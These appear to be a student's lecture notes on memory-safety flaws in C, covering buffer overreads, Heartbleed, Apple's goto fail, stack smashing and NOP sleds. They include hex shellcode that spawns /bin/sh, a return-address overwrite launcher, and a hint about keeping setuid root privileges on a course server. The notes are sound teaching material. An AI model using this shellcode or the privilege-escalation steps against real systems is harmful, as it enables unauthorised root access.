# Buffer Overreads
```c
// /srv/print16.c
#include <stdio.h>
#include <string.h>

void main(int argc, char** argv) {
	char buffer[16];
	strncpy(buffer, argv[1], sizeof(buffer));
	printf("%s\n", buffer)
}
```
 - Copies the input and prints it to the terminal
 - If the string is 16+ characters, it prints those 16 characters (filled buffer) and then prints garbage as there is no null terminator

```c
// /srv/print16b.c
#include <stdio.h>
#include <string.h>

void main(int argc, char** argv) {
	char buffer2[] = "this buffer is not used";
	char buffer[16];
	strncpy(buffer, argv[1], sizeof(buffer));
	printf("%s\n", buffer)
}
```
 - Does the same as above, although string inputs with more than 16 characters will run into all of `buffer2` (until the null terminator)
 - Simple off by one error is printing memory that shouldn't be printable

### Heartbleed
 - Fault in OpenSSL versions released from 2012-2014
 - TLS Heartbeat mechanism prevents SSL/TLS timeouts when no data is being transmitted
 - One peer sends random data + payload length; other peer responds with identical payload
	 - Trusts the payload length provided by the user, didn't check if the length of the data matched the payload length
	 - Stores the message received in memory, then copies `<payload length>` characters and sends it back
 - Code was missing a bounds check
	 - Attacker can request up to 64kb from server's private memory space
		 - Might be useless garbage, might be passwords or encryption keys or private data
		 - Things that are encrypted in the TLS server are probably worth encrypting (important)
	 - This memory might contain:
		 - What other users are doing
		 - The server's private key materials
		 - TLS session keys
		 - etc
 - Buffer overread flow
 - Within 24 hours, scripts were everywhere to exploit Heartbleed
	 - Took many months for a majority of servers to be patched
		 - OpenSSL is everywhere, sheer ubiquity of it made it hard to fully clear up


```c
// /srv/goto.c
#include <stdio.h>

void main() {
	printf ("Hello, ");
	goto world;
	printf("cruel ");
world:
	printf("world!\n");
}
```
### Apple's `goto` fail
 - Fault in code used by OSX 10.9, iOS 6.1, and iOS 7.0 to check validity of the signature key used by a server in a TLS/SSL connection
 - Enabled man-in-the-middle attackers to trick user into accepting counterfeit keys, resulting in non-private connections
	 - Skipped all the sanity checks to legitimize browser certificates
	 - Would accept basically any certificate as valid
 - Missed curly braces while using `goto` statements
	 - Someone accidentally pasted `goto fail` twice, it would hit the second `goto` statement and skip right to cleanup (passing all of the other verification checks)
 - `goto` is bad practice

# Buffer Overflows
```c
#define LINELEN 1024
char buffer[LINELEN]
// ...
strcpy(buffer, argv[1]) // <- Bad function never use this, use strncpy
// or gets (buffer);
// Reads until it hits the null terminator into the buffer
// Can fill the buffer and then just keep reading and blowing up memory
```
 - Among the most commonly exploited security flaws
 - The `strcpy` (or `gets`) don't check whether the string they're copying actually fits in the buffer
 - Some languages (Java) would throw an exception and crash the program
 - Not C/C++ (most common for systems programming), don't even notice something bad happened
	 - Benefit if you can prove that things will work out for performance heavy software (checking size of things can be omitted)
```c
// this is /srv/add.c
int add(int a, int b) {
	int c;
	c = a + b;
	return c;
}
void main() {
	int sum = add(3, 5);
}
```
```c
// this is /srv/overflow1.c
#include <stdio.h>
#include <string.h>

void foo (char * str) {
	char buffer[4];
	strcpy(buffer, str);
}

void main() {
	char str[128];
	int i;
	for (i=0; i<128; ++i) str[i] = 'A';
	foo(str);
}
```
 - Fills the stack with `AAAA`
	 - This will eventually overwrite the frame pointer, and then the return address
	 - If you overflow just enough to reach the return address, you can then set the return address to something otherwise inaccessible.
	 - ***Each of these things below are 16 bytes***
```
args:   0x1c3af0e4 (char * str) (can continue to overflow this, and the next, and etc)
		return address (main) (can continue to overflow this return address)
FP:	    0x41414141 (A's overflowing what used to be the frame pointer)
vars:	0x41414141 (char buffer[4])
Stack Pointer (SP)
```

### Manipulating execution flow
 - Attacker's goal:
	 - Exploit a buffer overflow fault to overwrite return address on stack
	 - When function call returns control will be directed to instruction of attackers choosing
```c
// this is /srv/overflow2.c

void foo() {
	char buffer[8];
	int * ret = buffer + 24; // Pointer to buffer + 24 bytes (as buffer is a char)
							 // 32 bytes in total as buffer is 8 bytes
							 // 32 bytes is now pointing to the saved return address
	(*ret) += 1;             // Change the return address to the next byte
							 // This skip `x = 1` somehow and prints 0
}

void main() {
	int x = 0;
	foo();
	x = 1;
	printf("%d\n", x);
}
```
 - This program prints 0 as it overflows the return address

### Interactive Class
Using `/srv/lamest_joke.c`

only time privileges matter for a1 is when creating or opening a file
 - drop privileges after that

If you can make a program seg fault, theres a good chance you can own the program
 - indicative of memory error that the attacker is triggering
 - if you can then make it not seg fault again, you can manipulate execution flow

**GDB:**
 - compile with `-g`
 - gdb `./<program>`
 - breakpoints: `break <line>` (probably the next line to ensure the line you want has executed)
 - run code: `r`
 - print variable: `p <var>`
 - quit: `q`

```
(gdb) info frame
Stack level 0, frame at 0x7fffffffe440:
 rip = 0x5555555553a0 in foo (lamestjoke.c:29); saved rip = 0x555555555482
 called by frame at 0x7fffffffe480
 source language c.
 Arglist at 0x7fffffffe430, args: offset=0
 Locals at 0x7fffffffe430, Previous frame's sp is 0x7fffffffe440
 Saved registers:
  rbp at 0x7fffffffe430, rip at 0x7fffffffe438
```
 - `saved rip` is where the return address of the function is stored
 - rbp: return base pointer
 - rip: return instruction pointer: when this stack frame is popped, what value goes into instruction pointer register (currently at the current instruction)
 - sp: stack pointer: where to push new stack frames
 - clobber this

Goal for `/srv/lamest_joke.c`
 - Determine what value the input should be to not cause a seg fault
 - Get return address of frame of foo (rip)
 - Get address of bar
 - Input the difference of these two things so that the return address of foo points to bar?

### Smashing the Stack
 - Manipulating the flow of execution as above, this process is sometimes called Stack Smashing
 - Step 1: Find buffer overflow flaw
 - Step 2: Smash the stack
 - Step 3: Spawn a shell -> execute arbitrary commands
	 - Particularly useful if program runs with setuid root/superuser privileges
 - Step 4: Profit

### Spawning a Shell
```c
// this is /srv/shellcode.c
#include <stdlib.h> //exit
#include <unistd.h> //execve

void main() {
	char* name[2];
	name[0] = "/bin/sh";
	name[1] = NULL;
	execve(name[0], name, NULL);
	exit(0);
}
```
 - This compiles to the following binary:
```
"\xeb\x2a\x5e\x89\x76\x08\xc6\x46"  
"\x07\x00\xc7\x46\x0c\x00\x00\x00"  
"\x00\xb8\x0b\x00\x00\x00\x89\xf3"  
"\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"  
"\xb8\x01\x00\x00\x00\xbb\x00\x00"  
"\x00\x00\xcd\x80\xe8\xd1\xff\xff"  
"\xff\x2f\x62\x69\x6e\x2f\x73\x68"  
"\x00\x89\xec\x5d\xc3";
```
```c
// this is /srv/spawnshell.c
void* shellcode = "\xeb\x2a\x5e\x89\x76\x08\xc6\x46"  
				  "\x07\x00\xc7\x46\x0c\x00\x00\x00"  
				  "\x00\xb8\x0b\x00\x00\x00\x89\xf3"  
				  "\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"  
				  "\xb8\x01\x00\x00\x00\xbb\x00\x00"  
				  "\x00\x00\xcd\x80\xe8\xd1\xff\xff"  
				  "\xff\x2f\x62\x69\x6e\x2f\x73\x68"  
				  "\x00\x89\xec\x5d\xc3";
void main() {
	long int* ret = (long int*) &ret + 2;
	// Creates space on the stack for a pointer (plus 2 64 bit values)
	(*ret) = (long int)shellcode;
	// Then assigns the shellcode to that space
}
```
 - To fix (for assignment 2):
	 - When you create a shell, it drops setuid permissions immediately
	 - On mocha there is a version of `/bin/sh` that does not drop permissions
		 - Need to point to that one instead
 - The stack:
```
return address = &shellcode
frame pointer
long int * ret
```

### Shellcode
 - Shellcode need not simply spawn a shell
	 - Many shellcode examples can be found online
	 - Some half-decent tutorials on how to write your own shellcode
	 - (Slide 13 on module0b)

### Exploiting a real program
 - Its trivial to execute the above attack if we control the source code
	 - Not really an attack
 - What if we don't control the source code
	 - Where do we locate code to spawn a shell?
		 - A1: Write it into the buffer we're overflowing
		 - A2: Export it to an environment variable (these live at the top of the stack)
		 - A3: Pass it to the program via argv
	 - How do we find the return address on the stack?
		 - ret addr will vary based on CPU, OS, compiler version, flags, etc
		 - A4: Trial and error
		 - A5: Debugger/disassembler
		 - A6: Repeat return address many times, then hope for the best
	 - What if we don't know the exact address of the shellcode?

### No-operations (NOPs)
```c
int i = 0;  
i+1;            // add 1 to i; promptly discard result  
;               // NULL statement  
{}              // empty block
for ( int j=0; j<100; ++j ) { }    // do nothing... 100 times  
for ( int j=0; j<100; ++j );       // do nothing... 100 times  
(void) 0;       // a “canonical” NOP in C  
char nop [] = “\x90”; // x86 NOP instruction
```
 - If we don't know the exact address of a shellcode, use a NOP sled
	 - Pad the start of the shellcode with a bunch of NOPs
	 - If we return to any address in the sequence of NOPs, execution flow will slide right into our shellcode
